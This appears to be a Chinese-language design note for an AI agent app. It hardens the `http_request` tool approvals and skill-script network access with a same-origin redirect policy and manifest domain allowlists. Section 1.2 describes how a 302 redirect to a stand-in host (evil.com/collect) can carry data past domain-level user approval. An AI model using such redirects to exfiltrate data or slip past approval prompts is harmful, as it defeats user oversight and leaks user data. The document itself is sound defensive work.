# 技能脚本的网络出口（W-54）

**日期**：2026-11-10
**触发**：审计遗留项「技能桥 `agent.http` 现返回 `script_approval_denied`，恢复需 manifest 声明域名白名单」
**改动**：3 个新文件、4 个文件被改、1 个新 harness

---

## 一、这条遗留项其实是两件事

### 1. 功能缺陷：脚本形态的技能没有联网能力

`http_request` 需要人确认（审计 F1 加的），而脚本跑在 Rhino 的普通线程里——求值过程
不可挂起，审批是 suspend 的。`runBlocking` 弹审批会永久占住一个 worker，且
`SCRIPT_TIMEOUT` 的取消打断不了它（用户不点弹窗，那条线程就再也不回来）。

所以当前的实现是一刀切拒绝：

```kotlin
if (target?.needsApprovalFor(obj) == true) {
    return ToolResult.fail(code = "script_approval_denied", …)
}
```

对 `shell_run` 这类「后果没法在弹窗里说清」的工具，一刀切是对的。但「这个技能只查
一个固定 API」不是——它需要的是**事先授权**，不是每次确认。

### 2. 安全缺陷：一次 302 就能绕过域名级审批

修这件事时才发现的：`http_request` 用 `LlmHttp.short`，OkHttp 默认
`followRedirects = true`。而审批按**域名**记忆（`ApprovalScope.of` 给
`http_request` 的 key 是 `net_request:<host>`）。两者叠加：

> 用户批准 `api.example.com` → 该域名本会话不再弹窗 → 服务端（或中间人）返回
> `302 Location: https://evil.com/collect?d=…` → OkHttp 自动跟过去 →
> **数据到了 evil.com，用户从头到尾只看见过一个域名**。

域名级授权越精确，这条口子越致命：它把「按域名授权」直接退化成「按第一个域名授权」。
这条与技能无关，主对话里的每一次 `http_request` 都受影响——只是没人往这个方向想过。

---

## 二、做法

### 2.1 重定向：只跟同源，跨源停下交回调用方

新增 `core/net/RedirectPolicy.kt`（纯函数），`HttpRequestTool` 关掉自动跟随、逐跳判定：

| 情形 | 处理 | 理由 |
|---|---|---|
| 同 host、同端口、`http→https` | 跟随 | 升级加密，且目标就是同一台服务器 |
| 同 host、同端口、同 scheme | 跟随 | 补尾斜杠、`/v1` → `/v1/` 这类 |
| 跨 host / 跨端口 | **停** | 换了一台服务器，就是换了一个授权对象 |
| `https→http` | **停** | 降级到明文，等于把已加密的内容交出去 |
| 超过 3 跳 | 停 | 环状跳转与跳转链拖时间 |
| `ftp://` / `file://` 等 | 停 | 不是我们能跟随的传输层 |

停下时返回 `http_redirect_stopped`，**带上目标地址**，让模型/脚本对**新地址**重新发起
——那就是一次新的、用户看得见的授权。

为什么不在 `RedirectPolicy` 里「校验域名是否已授权」：它是纯函数，手里没有任何授权信息。
在那里"校验"只能校验"与起始域名相同"，和直接 Stop 是一回事，却让调用方误以为
跳转已被批准。返回 Stop 并说明去向，语义才不歧义。

顺带按 RFC 处理了方法降级：303 一律转 GET 并丢请求体；301/302 上的 POST 同样转 GET
（浏览器一致行为）；307/308 明确保持方法与请求体。

### 2.2 技能网络：把"同意"提前到安装那一刻

新增 `core/net/HostAllowlist.kt` + `core/skill/SkillNetGrant.kt`（都是纯函数），
manifest 新增 `net_hosts` 字段：

```json
{
  "id": "com.example.weather",
  "tools": ["http_request"],
  "net_hosts": ["wttr.in", "*.openweathermap.org"]
}
```

判定三道，**任一不满足就拒**：

1. **来源允许执行脚本**：只有 packaged（含用户显式授权过的导入技能）才可能走到这里。
   imported / remote / 未知来源的 manifest 不可信，写了 `net_hosts` 也不算数。
2. **请求地址落在 `net_hosts` 内**：按真实请求主机比较（去 userinfo / 端口 / 尾点、小写）。
3. **不是公网明文**：脚本没法把「这是明文、Key 会裸奔」解释给用户，一律按带凭据从严。

清单校验是 fail-closed 的：

| 写法 | 结果 | 理由 |
|---|---|---|
| `api.example.com` | 合法 | 精确 |
| `*.example.com` | 合法 | 匹配任意层子域，**不含** `example.com` 本身 |
| `*` | **非法** | 等于放开全网 |
| `https://api.example.com` | 非法 | 只写主机名 |
| `api.example.com/v1` | 非法 | 只写主机名 |
| `api.*.com` / `*.com` | 非法 | 中间通配、通配顶级域都没法审 |
| `xexample.com` vs `*.example.com` | 不命中 | 按点边界比较，不是字符串 `endsWith` |

**两处共用同一份判据**：脚本桥的第三道门（`SkillRuntimeBridge.invoke`）和执行器的
`approval`（`buildToolExecutor`）都调 `SkillNetGrant`。审计 F4 的教训就是两处各写一套
必然漂移——一处 fail-open、一处 fail-closed，最后表现为「桥放行了，执行器又拒成
`approval_denied`」，而排查要从技能作者的错误码倒推回来。

拒绝码分成两个：

- `script_net_denied`：网络范围问题（没声明 / 不在范围内 / 明文）——告诉作者去改 manifest；
- `script_approval_denied`：其它需要确认的工具——告诉作者回主对话手工调。

混用一个码，技能作者永远不知道该改哪里。

## 三、不变量（写进 harness，改坏就红）

1. 裸 `*` 在任何一层都拿不到全网（清单校验 + 匹配层各有一道，纵深）；
2. `*.example.com` 不含根域，也不匹配 `xexample.com`（点边界）；
3. 重定向跨域 / 跨端口 / https 降级一律停；
4. 白名单内但走公网明文仍然拒；
5. 来源不可信的技能，声明了域名也不放行；
6. 非网络工具不受这条规则影响（`read_file` / `shell_run` 仍走原来的逐次审批拒绝）。

## 五、代价与没做的

**代价**

- 主对话里 `http_request` 遇到跨域 302 不再自动跟，用户（模型）需要多发起一次请求。
  这是有意的：那一次会重新弹审批。
- 技能作者必须显式声明域名，否则仍然调不通。存量技能只有 `weather`（prompt 形态，
  本来就不走脚本桥），所以没有兼容性破坏。

**没做的**

1. **安装界面还没展示 `net_hosts`**。声明是"事先授权"的载体，用户看不见就等于没授权。
   下一步应当在技能卡片上加一行「可访问域名：…」，并把非法声明在导入时就拒掉
   （现在只在运行期拒）。
2. **不解析 DNS**。`*.example.com` 若能通过 DNS 劫持解析到内网地址，本判据看不出来。
   真正要防 DNS rebinding 得在连接层比对解析后的 IP，那是 OkHttp `Dns` 接口的活，
   与 EndpointPolicy 的取舍一致（只回答"字面事实"）。
3. **重定向后的 `Referer` / `Authorization` 转发**。跨域已停，所以这条暂时没有场景；
   若将来允许跨域跟随，必须显式剥掉凭据头。
